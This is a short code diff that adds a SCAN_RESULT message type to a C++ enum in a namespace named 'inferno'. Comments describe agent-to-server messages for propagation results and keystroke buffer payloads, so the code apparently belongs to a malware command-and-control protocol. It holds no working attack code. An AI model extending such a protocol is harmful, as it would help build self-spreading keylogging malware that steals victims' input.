@@ -24,6 +24,8 @@ namespace inferno {
         PROPAGATE_RES = 0x0107, // Agent -> Server: propagation result
         KEYLOG_DATA = 0x0108, // Agent -> Server: keystroke buffer payload
 
+        SCAN_RESULT = 0x0109, // Agent -> Server: Tier 2 scanner findings
+
 };
 
 } // namespace inferno
